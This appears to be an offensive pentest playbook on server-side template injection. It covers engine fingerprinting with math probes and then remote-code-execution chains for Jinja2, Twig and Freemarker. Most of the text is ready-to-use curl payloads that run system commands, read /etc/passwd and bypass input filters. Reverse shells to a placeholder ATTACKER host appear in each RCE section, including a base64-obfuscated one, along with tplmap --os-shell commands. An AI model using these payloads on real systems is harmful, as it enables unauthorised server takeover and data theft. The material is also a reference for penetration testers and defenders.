# Web – Server-Side Template Injection (SSTI)

### SSTI Detection via Math Expressions [added: 2026-04]
- **Tags:** #SSTI #TemplateInjection #Detection #Polyglot #Jinja2 #Twig #Freemarker #Mako #tplmap #OWASPA3
- **Trigger:** User input is rendered in a server-side template — you inject `{{7*7}}` or `${7*7}` and the response shows `49` instead of the literal expression. Common in email templates, PDF generators, CMS page builders, custom greeting/notification systems
- **Prereq:** A parameter whose value is processed by a server-side template engine (Jinja2, Twig, Freemarker, Mako, Pebble, Velocity, ERB, Smarty, etc.) + the result is reflected back to you in some form
- **Yields:** Identification of the template engine in use and confirmation of SSTI, which typically leads to RCE. The detection phase tells you which engine-specific payload to use next
- **Opsec:** Low
- **Context:** SSTI is commonly found where user input ends up in templates — profile fields rendered in emails, custom page builders, notification messages, or any feature that says "customize your template." The key indicator is that mathematical or string operations are evaluated server-side. Use a decision tree to fingerprint the engine: test `{{7*7}}` first, then differentiate with `{{7*'7'}}` (Jinja2 returns `7777777`, Twig returns `49`).
- **Payload/Method:**
```bash
# Step 1: Polyglot SSTI probe — covers multiple engines at once
POLYGLOT='${{<%[%"}}%\{{7*7}}'
curl -s "http://target/page?name=${POLYGLOT}" | grep "49"

# Step 2: Engine-specific detection payloads
# Jinja2 / Twig test:
curl -s "http://target/page?name={{7*7}}"           # → 49 = Jinja2 or Twig
# Differentiate Jinja2 vs Twig:
curl -s "http://target/page?name={{7*'7'}}"          # → 7777777 = Jinja2, 49 = Twig
# Freemarker:
curl -s "http://target/page?name=${7*7}"             # → 49 = Freemarker or other $-syntax
# Mako:
curl -s "http://target/page?name=${7*7}"             # → 49 (also test <% import os %>)
# ERB (Ruby):
curl -s "http://target/page?name=<%= 7*7 %>"        # → 49 = ERB
# Smarty (PHP):
curl -s "http://target/page?name={7*7}"              # → 49 = Smarty
# Pebble (Java):
curl -s "http://target/page?name={{7*7}}"            # → 49, then try Pebble-specific

# Step 3: Automated detection with tplmap
tplmap -u "http://target/page?name=*"
# tplmap tests all engines and confirms exploitability

# Step 4: Decision tree summary
# {{7*7}} = 49 → Jinja2, Twig, Pebble, or Nunjucks
#   → {{7*'7'}} = 7777777 → Jinja2 (Python)
#   → {{7*'7'}} = 49 → Twig (PHP)
# ${7*7} = 49 → Freemarker, Mako, Velocity, or Thymeleaf
# <%= 7*7 %> = 49 → ERB (Ruby)
# {7*7} = 49 → Smarty (PHP)
# #{7*7} = 49 → Thymeleaf or Pebble
```

### Jinja2 SSTI to RCE [added: 2026-04]
- **Tags:** #SSTI #Jinja2 #Python #Flask #Django #RCE #MRO #ClassChain #Subprocess #OWASPA3 #tplmap
- **Trigger:** SSTI confirmed with `{{7*7}}` returning `49` and `{{7*'7'}}` returning `7777777` — this confirms Jinja2 (Python). Application uses Flask, Django, or another Python framework with Jinja2 templating
- **Prereq:** Confirmed Jinja2 SSTI + injection point that renders the full template output (not truncated) + no strict sandbox or restrictive character filtering on `_`, `.`, `[`, `]`
- **Yields:** Remote code execution on the server as the web application user — full command execution, reverse shell, file read/write
- **Opsec:** Med
- **Context:** Jinja2 is the default template engine for Flask and commonly used in Django. The classic exploitation chain traverses Python's Method Resolution Order (MRO) to access the `subprocess.Popen` class from a string object. Newer Python versions may change the class index, so the enumeration approach (looping through subclasses) is more reliable than hardcoded indices.
- **Payload/Method:**
```bash
# Step 1: Confirm and enumerate available classes
curl -s "http://target/page?name={{''.__class__.__mro__}}"
# Should return: (<class 'str'>, <class 'object'>)

# Step 2: List all subclasses of object (find useful ones)
curl -s "http://target/page?name={{''.__class__.__mro__[1].__subclasses__()}}"
# Look for: subprocess.Popen, os._wrap_close, warnings.catch_warnings

# Step 3: Find the index of subprocess.Popen (varies by Python version)
# Auto-find approach:
curl -s "http://target/page?name={%25+for+c+in+''.__class__.__mro__[1].__subclasses__()+%25}{%25+if+'Popen'+in+c.__name__+%25}{{loop.index0}}{%25+endif+%25}{%25+endfor+%25}"

# Step 4: RCE via subprocess.Popen (replace INDEX with the number found above)
curl -s "http://target/page?name={{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}"

# Step 5: Universal payload using os._wrap_close (often more reliable)
curl -s "http://target/page?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}"

# Step 6: Payload using config/request objects (Flask-specific shortcuts)
curl -s "http://target/page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
curl -s "http://target/page?name={{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}"

# Step 7: Reverse shell
curl -s "http://target/page?name={{''.__class__.__mro__[1].__subclasses__()[INDEX]('bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261\"',shell=True,stdout=-1).communicate()}}"

# Step 8: Filter bypass techniques
# If _ is blocked:  use |attr('__class__')
curl -s "http://target/page?name={{''|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fmro\\x5f\\x5f')}}"
# If . is blocked: use ['__class__'] bracket notation
curl -s "http://target/page?name={{''['__class__']['__mro__'][1]['__subclasses__']()}}"

# Step 9: Automated exploitation with tplmap
tplmap -u "http://target/page?name=*" --os-shell
```

### Twig SSTI to RCE [added: 2026-04]
- **Tags:** #SSTI #Twig #PHP #Symfony #RCE #SelfEnv #RegisterUndefinedFilterCallback #OWASPA3 #LaravelBlade
- **Trigger:** SSTI confirmed with `{{7*7}}` returning `49` and `{{7*'7'}}` also returning `49` (not `7777777`) — this confirms Twig (PHP). Application uses Symfony, Laravel (Twig bridge), or custom PHP with Twig
- **Prereq:** Confirmed Twig SSTI + the Twig version and configuration (older versions allow `_self.env`, newer versions have removed some dangerous methods) + injection renders full output
- **Yields:** Remote code execution on the PHP server — execute system commands, read files, establish reverse shell
- **Opsec:** Med
- **Context:** Twig is the primary template engine for Symfony and is also used in other PHP frameworks. The exploitation chain depends on the Twig version. In Twig 1.x, `_self.env` gives access to the Environment object which can register arbitrary filter callbacks (including `exec`/`system`). In Twig 2.x/3.x, `_self` only returns the template name, so you need alternative gadgets through registered extensions or Symfony-specific objects.
- **Payload/Method:**
```bash
# Step 1: Confirm Twig and check version indicators
curl -s "http://target/page?name={{_self}}"
# Twig 1.x: returns the Twig_Template object
# Twig 2.x+: returns the template name string

# Step 2: Twig 1.x RCE via _self.env.registerUndefinedFilterCallback
# Register exec as a filter callback, then call it:
PAYLOAD='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
curl -s "http://target/page?name=${PAYLOAD}"

# Step 3: Twig 1.x RCE via _self.env.setCache + include
# Write a PHP file to a writable directory, then include it:
PAYLOAD='{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}'
curl -s "http://target/page?name=${PAYLOAD}"

# Step 4: Twig 2.x/3.x — use filter() with an arrow function (if allowed)
PAYLOAD='{{["id"]|filter("system")}}'
curl -s "http://target/page?name=${PAYLOAD}"

# Step 5: Twig 2.x/3.x — map() and reduce() as alternative execution sinks
PAYLOAD='{{["id"]|map("system")}}'
curl -s "http://target/page?name=${PAYLOAD}"
PAYLOAD='{{["id",""]|sort("system")}}'
curl -s "http://target/page?name=${PAYLOAD}"

# Step 6: File read without RCE
PAYLOAD='{{"/etc/passwd"|file_excerpt(1,30)}}'
curl -s "http://target/page?name=${PAYLOAD}"

# Step 7: Reverse shell (URL-encoded for curl)
PAYLOAD='{{["bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\""]|filter("system")}}'
curl -s "http://target/page?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")"

# Step 8: Automated with tplmap
tplmap -u "http://target/page?name=*" -e twig --os-shell
```

### Freemarker SSTI to RCE [added: 2026-04]
- **Tags:** #SSTI #Freemarker #Java #SpringBoot #RCE #Execute #ObjectConstructor #NewBuiltIn #OWASPA3 #ApacheStruts
- **Trigger:** SSTI confirmed with `${7*7}` returning `49` in a Java-based application — common in Spring Boot, Apache Struts, or any Java app using Freemarker templates. May also see Freemarker error messages in responses
- **Prereq:** Confirmed Freemarker SSTI + the `new` built-in or `Execute`/`ObjectConstructor` not restricted in the Freemarker configuration + injection point that renders the template output
- **Yields:** Remote code execution on the Java application server — execute OS commands, read/write files, establish reverse shell
- **Opsec:** Med
- **Context:** Freemarker is widely used in Java web applications (Spring Boot, Struts, custom MVC). The most direct RCE path uses the `?new` built-in to instantiate `freemarker.template.utility.Execute` or `ObjectConstructor`. In newer versions or hardened configs, the `new` built-in may be restricted via `TemplateClassResolver`. Alternative paths go through the Java reflection API or specific Spring beans accessible in the template context.
- **Payload/Method:**
```bash
# Step 1: Confirm Freemarker SSTI
curl -s "http://target/page?name=\${7*7}"         # → 49
curl -s "http://target/page?name=<#assign x=7*7>\${x}"  # → 49 (FTL directive syntax)

# Step 2: RCE via Execute class (classic, Freemarker < 2.3.17 or unrestricted)
PAYLOAD='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
curl -s "http://target/page?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")"

# Step 3: RCE via ObjectConstructor (alternative)
PAYLOAD='<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>${oc("java.lang.Runtime").getRuntime().exec("id")}'
curl -s "http://target/page?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")"

# Step 4: Read command output properly (Runtime.exec returns Process, need to read stream)
PAYLOAD='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
# Execute class handles output natively — preferred over Runtime.exec

# Step 5: RCE via JythonRuntime (if Jython is on classpath)
PAYLOAD='<#assign jr="freemarker.template.utility.JythonRuntime"?new()><@jr>import os;os.system("id")</@jr>'

# Step 6: File read via built-in I/O (if allowed)
PAYLOAD='${.data_model.keySet()}'  # Enumerate available objects in the model
# Or use ?api to access Java methods:
PAYLOAD='<#assign classloader=object?api.class.protectionDomain.classLoader><#assign is=classloader.getResourceAsStream("/etc/passwd")><#assign isr=oc("java.io.InputStreamReader",is)><#assign br=oc("java.io.BufferedReader",isr)><#list 1..100 as _><#assign line=br.readLine()!><#if line?has_content>${line}\n</#if></#list>'

# Step 7: Reverse shell
PAYLOAD='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}'
# The base64 decodes to: bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Step 8: Bypass when ?new is restricted
# Try accessing Spring beans or other objects in the template model:
PAYLOAD='${springMacroRequestContext.webApplicationContext.getBean("freemarker.template.utility.Execute").exec(["id"])}'
# Or enumerate available variables:
PAYLOAD='<#list .data_model as key, value>${key}: ${value}<br></#list>'

# Step 9: Automated with tplmap
tplmap -u "http://target/page?name=*" -e freemarker --os-shell
```
